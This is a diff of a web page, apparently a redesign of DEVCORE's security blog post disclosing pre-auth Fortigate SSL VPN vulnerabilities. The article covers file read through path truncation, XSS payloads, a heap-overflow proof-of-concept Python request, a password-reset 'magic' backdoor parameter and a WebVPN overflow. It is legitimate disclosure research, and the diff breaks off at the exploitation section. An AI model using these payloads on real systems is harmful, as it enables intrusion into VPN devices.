@@ -1,109 +1,491 @@
 
+
 <!DOCTYPE html>
-<html lang="zh-TW">
-  <head>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta charset="utf-8" />
-    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
-    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
-    <meta name="description" property="og:description" content="Last month, we talked about Palo Alto Networks GlobalProtect RCE as an appetizer. Today, here comes the main dish!" />
-    <meta name="keywords" content="Advisory, VPN, RCE" />
-    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
-    <meta property="og:title" content="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE 戴夫寇爾" />
-    <meta property="og:url" content="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://devco.re/assets/img/blog/20190807/cover.png" />
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:site" content="d3vc0r3">
-    <meta name="twitter:title" content="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE 戴夫寇爾">
-    <meta name="twitter:description" content="Last month, we talked about Palo Alto Networks GlobalProtect RCE as an appetizer. Today, here comes the main dish!">
-    <meta name="twitter:creator" content="d3vc0r3">
-    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20190807/cover.png">
-    <meta name="twitter:domain" content="devco.re">
-    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
-    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
-    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
-    <meta name='yandex-verification' content='4561963cf1d18fe3' />
-    <meta property="fb:admins" content="120968921404653" />
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
 
-    <link rel="canonical" href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/"/>
-    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
 
-    <!-- Google Tag Manager -->
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
-    <!-- End Google Tag Manager -->
-  </head>
-  <body>
-    <div class="page">
-      <div class="container--wrapper">
-        <div class="topbar">
-          <div class="topbar__brand">
-            <a href="/en/">
-                <div class="logo">
-                  DEVCORE
-                </div></a>
-            <p class="slogan">
-              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
-            </p>
-          </div>
-          <div class="drawer" id="drawer">
-            <div class="drawer__container">
-              <nav class="main-menu">
-                <div class="hidden">
-                  Menu
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Perform comprehensive attack simulation from unlimited aspects to achieve the designated drill scenario without impacting enterprise operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltrate designated enterprise systems with hacker mindset and techniques to uncover potential vulnerabilities, assessing the risk of breach or damage to enterprise assets.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in resource distribution and long-term defensive strategy development from the attacker's perspective based on red team assessment.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in defending and preventing incidents efficiently from the attacker's perspective, including response procedures and analysis of attack targets, techniques, and vulnerabilities.
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
                 </div>
-                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
-                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
-                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
-                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
-                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
-              </nav>
-              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
-              <nav class="lang-menu">
-                <div class="lang-menu__label">
-                  Lang:
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research leading cybersecurity techniques and trends, perform comprehensive security assessments of enterprise products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research into the risk of enterprise systems, identify potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Publish vulnerability research and share security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Uncover and report critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
                 </div>
-                <a href="/" class="lang-menu__link">中文</a>
-                <a href="/en/" class="lang-menu__link">English</a>
-              </nav>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                DEVCORE was founded by a world-class white hat hacker team, providing cybersecurity services and focusing on Red Team Assessment and Penetration Testing services.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    A team of experts with a hacker mindset, exploring new exploitation techniques, and upholding strict morality, self-discipline, and caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    The history, research achievements, and award information of DEVCORE.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    Provide diverse internship channels and scholarship programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Guidelines for the use of the DEVCORE trademark.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
-            <div class="bars">
-              <div class="bar"></div>
-              <div class="bar"></div>
-              <div class="bar"></div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </button>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
         </div>
-      </div><main role="main">
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
 
+                      <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/VPN/">#VPN</a> <a href="/en/blog/tag/RCE/">#RCE</a> 
+                    </span>
+                    <h1>
+                        Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/meh">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/meh.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/meh">Meh</a></span>
+                        <span class="date">2019-08-09</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20190807/cover.png"/>
+                    </div>
+                    
 
-          <div class="container--wrapper">
-            <div class="container">
-              <section class="blog-header">
-                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/" style="text-transform: uppercase;">Tech Editorials</a></small>
-                <img src="https://devco.re/assets/img/blog/20190807/cover.png" class="blog-header__image" alt="Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN" />
-                <h1 class="blog-header__title">
-                  Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN
-                </h1>
-                <div class="blog-header__tags">
-                  
-                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/VPN/" class="blog-header__tag">VPN</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a>
-                </div>
-          
-          
-                <p class="blog-header__info">
-                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/meh.jpg)"></span> <a href="/en/blog/author/meh" class="author-name">Meh</a> <time class="date">on 2019-08-09 </time>
-                </p>
-          
-              </section>
-              <article class="article">
-          <p>Author: Meh Chang(<a href="https://twitter.com/mehqq_">@mehqq_</a>) and Orange Tsai(<a href="https://twitter.com/orange_8361">@orange_8361</a>)</p>
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p>Author: Meh Chang(<a href="https://twitter.com/mehqq_">@mehqq_</a>) and Orange Tsai(<a href="https://twitter.com/orange_8361">@orange_8361</a>)</p>
 
 <p>Last month, we talked about <a href="https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/">Palo Alto Networks GlobalProtect RCE</a> as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!</p>
 <ul>
@@ -132,27 +514,27 @@
 
 <h1 id="fortigate-ssl-vpn">Fortigate SSL VPN</h1>
 
-<p>Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL <code class="highlighter-rouge">/remote/login</code>. Here is the technical feature of Fortigate:</p>
+<p>Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL <code class="language-plaintext highlighter-rouge">/remote/login</code>. Here is the technical feature of Fortigate:</p>
 
 <ul>
   <li>
-    <p>All-in-one binary<br />
-  We started our research from the file system. We tried to list the binaries in <code class="highlighter-rouge">/bin/</code> and found there are all symbolic links, pointing to <code class="highlighter-rouge">/bin/init</code>. Just like this:</p>
+    <p>All-in-one binary
+  We started our research from the file system. We tried to list the binaries in <code class="language-plaintext highlighter-rouge">/bin/</code> and found there are all symbolic links, pointing to <code class="language-plaintext highlighter-rouge">/bin/init</code>. Just like this:</p>
 
     <p><img src="/assets/img/blog/20190807/2.png" alt="" /></p>
 
-    <p>Fortigate compiles all the programs and configurations into a single binary, which makes the <code class="highlighter-rouge">init</code> really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no <code class="highlighter-rouge">/bin/ls</code> or <code class="highlighter-rouge">/bin/cat</code>!</p>
+    <p>Fortigate compiles all the programs and configurations into a single binary, which makes the <code class="language-plaintext highlighter-rouge">init</code> really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no <code class="language-plaintext highlighter-rouge">/bin/ls</code> or <code class="language-plaintext highlighter-rouge">/bin/cat</code>!</p>
   </li>
   <li>
-    <p>Web daemon<br />
-  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with <code class="highlighter-rouge">/bin/httpsd</code> on the port 443. The other is normal user interface, handled with <code class="highlighter-rouge">/bin/sslvpnd</code> on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.</p>
+    <p>Web daemon
+  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with <code class="language-plaintext highlighter-rouge">/bin/httpsd</code> on the port 443. The other is normal user interface, handled with <code class="language-plaintext highlighter-rouge">/bin/sslvpnd</code> on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.</p>
 
     <p>Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.</p>
 
     <p>In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!</p>
   </li>
   <li>
-    <p>WebVPN<br />
+    <p>WebVPN
   WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.</p>
   </li>
 </ul>
@@ -162,22 +544,22 @@
 <p>We found several vulnerabilities:</p>
 
 <h3 id="cve-2018-13379-pre-auth-arbitrary-file-reading"><a href="https://fortiguard.com/psirt/FG-IR-18-384">CVE-2018-13379</a>: Pre-auth arbitrary file reading</h3>
-<p>While fetching corresponding language file, it builds the json file path with the parameter <code class="highlighter-rouge">lang</code>:</p>
+<p>While fetching corresponding language file, it builds the json file path with the parameter <code class="language-plaintext highlighter-rouge">lang</code>:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">snprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="s">"/migadmin/lang/%s.json"</span><span class="p">,</span> <span class="n">lang</span><span class="p">);</span>
 </code></pre></div></div>
-<p>There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of <code class="highlighter-rouge">snprintf</code>. According to the man page, it writes <strong>at most size-1</strong> into the output string. Therefore, we only need to make it exceed the buffer size and the <code class="highlighter-rouge">.json</code> will be stripped. Then we can read whatever we want.</p>
+<p>There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of <code class="language-plaintext highlighter-rouge">snprintf</code>. According to the man page, it writes <strong>at most size-1</strong> into the output string. Therefore, we only need to make it exceed the buffer size and the <code class="language-plaintext highlighter-rouge">.json</code> will be stripped. Then we can read whatever we want.</p>
 
 <h3 id="cve-2018-13380-pre-auth-xss"><a href="https://fortiguard.com/psirt/FG-IR-18-383">CVE-2018-13380</a>: Pre-auth XSS</h3>
 <p>There are several XSS:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
 </code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;
 </code></pre></div></div>
 
 <h3 id="cve-2018-13381-pre-auth-heap-overflow"><a href="https://fortiguard.com/psirt/FG-IR-18-387">CVE-2018-13381</a>: Pre-auth heap overflow</h3>
-<p>While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for <code class="highlighter-rouge">&lt;</code> is <code class="highlighter-rouge">&amp;#60;</code> and this should occupies 5 bytes. If it encounter anything starts with <code class="highlighter-rouge">&amp;#</code>, such as <code class="highlighter-rouge">&amp;#60;</code>, it consider there is a token already encoded, and count its length directly. Like this:</p>
+<p>While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for <code class="language-plaintext highlighter-rouge">&lt;</code> is <code class="language-plaintext highlighter-rouge">&amp;#60;</code> and this should occupies 5 bytes. If it encounter anything starts with <code class="language-plaintext highlighter-rouge">&amp;#</code>, such as <code class="language-plaintext highlighter-rouge">&amp;#60;</code>, it consider there is a token already encoded, and count its length directly. Like this:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">c</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
 <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">'('</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">')'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'#'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'&lt;'</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">'&gt;'</span><span class="p">)</span>
     <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
@@ -194,14 +576,14 @@
         <span class="k">break</span><span class="p">;</span>
     <span class="k">case</span> <span class="sc">'&gt;'</span><span class="p">:</span>
     <span class="c1">// ...</span>
-    <span class="k">default</span><span class="o">:</span>
+    <span class="nl">default:</span>
         <span class="n">buf</span><span class="p">[</span><span class="n">counter</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
         <span class="k">break</span><span class="p">;</span>
     <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>If we input a malicious string like <code class="highlighter-rouge">&amp;#&lt;&lt;&lt;;</code>, the <code class="highlighter-rouge">&lt;</code> is still encoded into <code class="highlighter-rouge">&amp;#60;</code>, so the result should be <code class="highlighter-rouge">&amp;#&amp;#60;&amp;#60;&amp;#60;;</code>! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.</p>
+<p>If we input a malicious string like <code class="language-plaintext highlighter-rouge">&amp;#&lt;&lt;&lt;;</code>, the <code class="language-plaintext highlighter-rouge">&lt;</code> is still encoded into <code class="language-plaintext highlighter-rouge">&amp;#60;</code>, so the result should be <code class="language-plaintext highlighter-rouge">&amp;#&amp;#60;&amp;#60;&amp;#60;;</code>! This is much longer than the expected length 6 bytes, so it leads to a heap overflow.</p>
 
 <p>PoC:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
@@ -210,11 +592,11 @@
     <span class="s">'title'</span><span class="p">:</span> <span class="s">'x'</span><span class="p">,</span> 
     <span class="s">'msg'</span><span class="p">:</span> <span class="s">'&amp;#'</span> <span class="o">+</span> <span class="s">'&lt;'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20000</span><span class="p">)</span> <span class="o">+</span> <span class="s">';&lt;'</span><span class="p">,</span> 
 <span class="p">}</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://sslvpn:4433/message'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://sslvpn:4433/message'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h3 id="cve-2018-13382-the-magic-backdoor"><a href="https://fortiguard.com/psirt/FG-IR-18-389">CVE-2018-13382</a>: The magic backdoor</h3>
-<p>In the login page, we found a special parameter called <code class="highlighter-rouge">magic</code>. Once the parameter meets a hardcoded string, we can modify any user’s password.</p>
+<p>In the login page, we found a special parameter called <code class="language-plaintext highlighter-rouge">magic</code>. Once the parameter meets a hardcoded string, we can modify any user’s password.</p>
 
 <p><img src="/assets/img/blog/20190807/3.png" alt="" /></p>
 
@@ -228,7 +610,7 @@
 <p>This is a vulnerability on the WebVPN feature. While parsing JavaScript in the HTML, it tries to copy content into a buffer with the following code:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">js_buf</span><span class="p">,</span> <span class="n">js_buf_len</span><span class="p">);</span>
 </code></pre></div></div>
-<p>The buffer size is fixed to <code class="highlighter-rouge">0x2000</code>, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.<br />
+<p>The buffer size is fixed to <code class="language-plaintext highlighter-rouge">0x2000</code>, but the input string is unlimited. Therefore, here is a heap overflow. It is worth to note that this vulnerability can overflow Null byte, which is useful in our exploitation.
 To trigger this overflow, we need to put our exploit on an HTTP server, and then ask the SSL VPN to proxy our exploit as a normal user.</p>
 
 <h1 id="exploitation">Exploitation</h1>
@@ -238,13 +620,13 @@ To trigger this overflow, we need to put our exploit on an HTTP server, and then
 <h3 id="cve-2018-13381">CVE-2018-13381</h3>
